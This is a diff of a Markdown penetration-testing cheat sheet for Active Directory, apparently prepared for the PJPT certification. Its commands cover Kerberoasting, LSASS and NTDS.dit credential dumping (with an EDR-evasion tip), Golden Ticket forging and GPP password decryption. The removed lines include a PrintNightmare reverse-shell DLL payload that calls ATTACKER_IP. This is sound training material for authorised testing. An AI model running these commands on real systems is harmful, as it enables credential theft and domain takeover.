-| `-M <MODULE>` | Specify the module to run (e.g. `lsassy`). |
-| `-L` | List available modules for each protocol. |
-
-</details>
-
-### 6.2 Kerberoasting
-
-#### 6.2.1 GetUserSPNs.py <sup>· PJPT</sup>
-
-```bash
-python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE>
 ```
 
 <details>
@@ -748,13 +1027,22 @@ python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
 - `<DOMAIN>/<USERNAME>:<PASSWORD>` — Credentials of any domain user.
 - `-dc-ip <DC_IP>` — Domain controller IP address.
 - `-request` — Requests TGS tickets for discovered SPN accounts.
+- `-outputfile <OUTPUT_FILE>` — Saves the captured TGS hashes to a file for cracking.
 
 </details>
 
-#### 6.2.2 Hashcat TGS cracking <sup>· PJPT</sup>
+#### 6.3.2 Cracking TGS hashes <sup>· PJPT</sup>
+
+**With hashcat:**
 
 ```bash
-hashcat -m 13100 SPNs-hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 <TGS_HASH_FILE> /usr/share/wordlists/rockyou.txt
+```
+
+**With John the Ripper:**
+
+```bash
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <TGS_HASH_FILE>
 ```
 
 <details>
@@ -763,19 +1051,27 @@ hashcat -m 13100 SPNs-hash.txt /usr/share/wordlists/rockyou.txt
 **Description**
 
 - Cracks Kerberos TGS ticket hashes offline.
-- Copy the hash output from GetUserSPNs.py into a file crackable by hashcat.
+- Copy the hash output from impacket-GetUserSPNs into a file crackable by hashcat or John.
+- John requires explicit format specification (`--format=krb5tgs`) for Kerberos TGS hashes.
 
 **Parameters**
 
-- `-m 13100` — Hash type for Kerberos 5 TGS-REP (etype 23).
-- `SPNs-hash.txt` — File containing the captured TGS hashes.
+- `-m 13100` — Hash type for Kerberos 5 TGS-REP etype 23 (hashcat).
+- `--format=krb5tgs` — Hash format for Kerberos TGS (John).
+- `<TGS_HASH_FILE>` — File containing the captured TGS hashes.
 - `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.
 
 </details>
 
-### 6.3 Token Impersonation <sup>· PJPT</sup>
+### 6.4 Token Impersonation <sup>· PJPT</sup>
 
-**In a Meterpreter session, list available tokens:**
+**Load the incognito module:**
+
+```
+load incognito
+```
+
+**List available user tokens:**
 
 ```
 list_tokens -u
@@ -793,24 +1089,27 @@ impersonate_token DOMAIN\\USERNAME
 **Description**
 
 - If a Meterpreter shell is active on a system, all available tokens on that machine can be enumerated.
+- The incognito module must be loaded first before listing and impersonating tokens.
 - You can impersonate any user whose token is present (e.g. a domain administrator who logged in previously).
 
 **Commands**
 
+- `load incognito` — Loads the incognito extension in the Meterpreter session.
 - `list_tokens -u` — Lists all user tokens available on the compromised system.
 - `impersonate_token DOMAIN\\USERNAME` — Adopts the security context of the specified user.
 
 </details>
 
-### 6.4 Credential Dumping
+### 6.5 Credential Dumping
 
-#### 6.4.1 Mimikatz <sup>· PJPT</sup>
+#### 6.5.1 Mimikatz <sup>· PJPT</sup>
 
 ```
 privilege::debug
 lsadump::lsa /patch
-sekurlsa::minidump lsass.DMP
+sekurlsa::minidump <LSASS_DUMP>
 sekurlsa::logonPasswords
+kerberos::list
 ```
 
 <details>
@@ -825,21 +1124,22 @@ sekurlsa::logonPasswords
 
 - `privilege::debug` — Enables SeDebugPrivilege for memory access.
 - `lsadump::lsa /patch` — Dumps LSA secrets from the running system.
-- `sekurlsa::minidump lsass.DMP` — Loads an offline LSASS dump file into Mimikatz.
+- `sekurlsa::minidump <LSASS_DUMP>` — Loads an offline LSASS dump file into Mimikatz.
 - `sekurlsa::logonPasswords` — Extracts credentials from LSASS memory.
+- `kerberos::list` — Lists all Kerberos tickets in the current session, including injected Golden Tickets.
 
 </details>
 
-#### 6.4.2 LSASS dump via Task Manager <sup>· PJPT</sup>
+#### 6.5.2 LSASS dump via Task Manager <sup>· PJPT</sup>
 
 1. Open Task Manager → **Details** tab
 2. Find `lsass.exe`
-3. Right-click → **Create dump file** → `lsass.DMP`
+3. Right-click → **Create dump file** → `<LSASS_DUMP>`
 4. Transfer the dump file to your Kali machine
 5. Extract credentials:
 
 ```bash
-pypykatz lsa minidump lsass.DMP
+pypykatz lsa minidump <LSASS_DUMP>
 ```
 
 <details>
@@ -852,24 +1152,24 @@ pypykatz lsa minidump lsass.DMP
 
 </details>
 
-#### 6.4.3 LSASS dump via procdump <sup>· PJPT</sup>
+#### 6.5.3 LSASS dump via procdump <sup>· PJPT</sup>
 
 ```bash
-procdump.exe -accepteula -ma lsass.exe out.dmp
+procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
 ```
 
 Alternatively, use the process ID to evade string-based EDR detection:
 
 ```powershell
-Get-Process lsass          # PowerShell
+Get-Process lsass
 ```
 
 ```cmd
-tasklist | findstr lsass   # CMD
+tasklist | findstr lsass
 ```
 
 ```bash
-procdump.exe -accepteula -ma <PID> out.dmp
+procdump.exe -accepteula -ma <PID> <DUMP_FILE>
 ```
 
 <details>
@@ -885,17 +1185,27 @@ procdump.exe -accepteula -ma <PID> out.dmp
 - `-accepteula` — Accepts the Sysinternals license agreement silently.
 - `-ma` — Writes a full memory dump.
 - `<PID>` — Process ID of lsass.exe.
+- `<DUMP_FILE>` — Destination filename for the memory dump.
 
 </details>
 
-#### 6.4.4 LSASS dump via crackmapexec <sup>· PJPT</sup>
+### 6.6 GPP / cPassword Attacks <sup>· PJPT</sup>
 
-```bash
-crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
+**Find cPassword in SYSVOL with Metasploit:**
+
+```
+use auxiliary/scanner/smb/smb_enum_gpp
+set RHOSTS <DC_IP>
+set SMBDomain <DOMAIN>
+set SMBUser <USERNAME>
+set SMBPass <PASSWORD>
+run
 ```
 
+**Decrypt the cPassword:**
+
 ```bash
-crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
+gpp-decrypt <CIPHERED_PASSWORD>
 ```
 
 <details>
@@ -903,12 +1213,22 @@ crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
 
 **Description**
 
-- `--lsa` dumps LSA secrets and password hashes; note that captured credentials are not stored in the cmedb database.
-- `-M lsassy` extracts credentials from LSASS memory and stores them.
+- Group Policy Preferences (GPP) historically stored passwords in XML files encrypted with a publicly known AES key.
+- These XML files can often be found on the NETLOGON and SYSVOL shares of domain controllers.
+- `gpp-decrypt` (installed by default on Kali) decrypts `cPassword` values found in GPP XML files.
+
+**Metasploit Module Parameters**
+
+- `RHOSTS` — Domain controller IP address.
+- `SMBDomain` — Target AD domain.
+- `SMBUser` — Username for SMB authentication.
+- `SMBPass` — Password for SMB authentication.
 
 </details>
 
-### 6.5 User and Group Manipulation <sup>· PJPT</sup>
+## 7. Persistence & Domain Dominance
+
+### 7.1 User and Group Manipulation <sup>· PJPT</sup>
 
 **Create a local user and add to the local Administrators group:**
 
@@ -932,40 +1252,14 @@ net group "Domain Admins" <USERNAME> /ADD /DOMAIN
 - When running with sufficient privileges, creates new users and adds them to privileged groups.
 - Can be used for persistence or to create alternate access accounts.
 - Works against both local SAM and Active Directory domains (when executed on a domain controller or with delegated rights).
+- Creating a domain user requires a Golden Ticket or Domain Admin credentials injected into the session.
 
 </details>
 
-### 6.6 GPP / cPassword Attacks <sup>· PJPT</sup>
-
-**Find cPassword in SYSVOL with Metasploit:**
-
-```
-use auxiliary/smb_enum_gpp
-```
-
-**Decrypt the cPassword:**
+### 7.2 Dumping NTDS.dit <sup>· PJPT</sup>
 
 ```bash
-gpp-decrypt <CIPHERED_PASSWORD>
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- Group Policy Preferences (GPP) historically stored passwords in XML files encrypted with a publicly known AES key.
-- These XML files can often be found on the NETLOGON and SYSVOL shares of domain controllers.
-- `gpp-decrypt` (installed by default on Kali) decrypts `cPassword` values found in GPP XML files.
-
-</details>
-
-## 7. Domain Dominance
-
-### 7.1 Dumping NTDS.dit <sup>· PJPT</sup>
-
-```bash
-secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm
+impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm
 ```
 
 <details>
@@ -975,6 +1269,7 @@ secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm
 
 - Extracts the NTDS.dit database from a domain controller, which contains NTLM hashes for every domain user.
 - Requires Domain Admin or equivalent privileges.
+- Quote the credentials string if the password contains special characters (e.g. `'DOMAIN/admin:Pass!@#'`).
 
 **Parameters**
 
@@ -984,7 +1279,7 @@ secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm
 
 </details>
 
-### 7.2 Golden Ticket <sup>· PJPT</sup>
+### 7.3 Golden Ticket Attack <sup>· PJPT</sup>
 
 **Execute in Mimikatz:**
 
@@ -993,12 +1288,13 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt
 misc::cmd
+kerberos::list
 ```
 
-**Verify access:**
+**Verify access to a remote machine:**
 
 ```cmd
-dir \\CLIENT-01\c$
+dir \\<MACHINE_NAME>\c$
 ```
 
 <details>
@@ -1007,121 +1303,16 @@ dir \\CLIENT-01\c$
 **Description**
 
 - A Golden Ticket grants unrestricted access to any resource in the domain by forging TGTs signed with the krbtgt account hash.
-- Requires the domain SID and the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit dump).
+- Requires the domain SID (obtained via impacket-lookupsid or BloodHound) and the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit dump).
 - Persistence is retained even if all user passwords are changed, as long as the krbtgt hash remains valid.
+- Verify success by accessing an administrative share (e.g. `C$`) on another domain machine.
 
 **Commands**
 
 - `lsadump::lsa /inject /name:krbtgt` — Extracts the krbtgt NTLM hash and domain SID.
-- `kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt` — Creates and injects a Golden Ticket into the current session.
+- `kerberos::golden ... /ptt` — Creates and injects a Golden Ticket into the current session.
 - `misc::cmd` — Opens a new command prompt with the injected ticket.
-
-</details>
-
-## 8. Additional Active Directory Attacks
-
-### 8.1 ZeroLogon (CVE-2020-1472) <sup>· PJPT</sup>
-
-> **Warning:** ZeroLogon can cause irreversible damage to the domain controller. In the worst case, the DC becomes non-functional. Always consult with the client before exploitation.
-
-**Check if the domain controller is vulnerable:**
-
-```bash
-git clone https://github.com/SecuraBV/CVE-2020-1472.git
-cd CVE-2020-1472
-sudo pip3 install -r requirements.txt
-python3 zerologon_tester.py <DC_NAME> <DC_IP>
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- ZeroLogon exploits a cryptographic flaw in the Netlogon Remote Protocol (MS-NRPC).
-- Allows an unauthenticated attacker on the network to set the domain controller's machine account password to an empty string, effectively taking full control.
-- In practice, testing for the vulnerability is often sufficient; full exploitation should only be performed with explicit client approval.
-
-**Parameters**
-
-- `<DC_NAME>` — NetBIOS computer name of the domain controller (e.g., `DC-01`).
-- `<DC_IP>` — IP address of the domain controller.
-
-</details>
-
-### 8.2 PrintNightmare (CVE-2021-1675) <sup>· PJPT</sup>
-
-#### 8.2.1 RCE — Remote Code Execution
-
-**Check if the target is vulnerable:**
-
-```bash
-rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
-```
-
-If the output includes `MS-PAR` and `MS-RPRN`, the target is vulnerable.
-
-**Create a malicious DLL:**
-
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f dll > shell.dll
-```
-
-**Host the DLL on an SMB share:**
-
-```bash
-smbserver.py share . -smb2support
-```
-
-**Set up the Metasploit listener:**
-
-```
-use multi/handler
-set LHOST <ATTACKER_IP>
-set LPORT <LPORT>
-set payload windows/x64/meterpreter/reverse_tcp
-run
-```
-
-**Run the exploit:**
-
-```bash
-python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '\\<ATTACKER_IP>\share\shell.dll'
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- Exploits the Windows Print Spooler service to load a malicious DLL from a remote SMB share.
-- The Spooler service runs as SYSTEM, granting immediate privileged access.
-- Requires valid domain credentials to interact with the print spooler over RPC.
-
-</details>
-
-#### 8.2.2 LPE — Local Privilege Escalation
-
-```powershell
-Import-Module .\cve-2021-1675.ps1
-Invoke-Nightmare
-
-# Or with custom credentials:
-Invoke-Nightmare -DriverName "Xerox" -NewUser "<USERNAME>" -NewPassword "<PASSWORD>"
-```
-
-<details>
-<summary>Details</summary>
-
-**Description**
-
-- Local privilege escalation variant of PrintNightmare that adds a new local administrator.
-- By default, `Invoke-Nightmare` (with no arguments) creates a user `adm1n` with password `P@ssw0rd` in the local Administrators group.
-
-**Parameters**
-
-- `-DriverName` — Optional printer driver name for the exploit.
-- `-NewUser` — Username for the new local admin account.
-- `-NewPassword` — Password for the new local admin account.
+- `kerberos::list` — Lists all Kerberos tickets to verify the Golden Ticket was injected.
+- `dir \\<MACHINE_NAME>\c$` — Tests access to a remote machine's C$ administrative share.
 
 </details>
